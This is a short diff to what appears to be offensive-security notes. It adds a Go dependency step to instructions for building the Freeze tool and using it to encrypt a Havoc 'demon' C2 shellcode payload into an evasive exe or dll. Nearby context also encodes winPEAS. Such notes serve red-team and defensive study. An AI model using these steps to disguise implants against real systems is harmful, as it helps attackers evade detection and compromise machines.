@@ -119,6 +119,7 @@ Invoke-EncodeAssembly -binaryPath .\winPEAS.exe -namespace winPEAS -capture $tru
 ```bash
 git clone https://github.com/Tylous/Freeze
 go build Freeze.go
+go get golang.org/x/sys/windows
 # Exe
 ./Freeze -I demon.x64.bin -encrypt -O havoc_freeze.exe 
 # dll
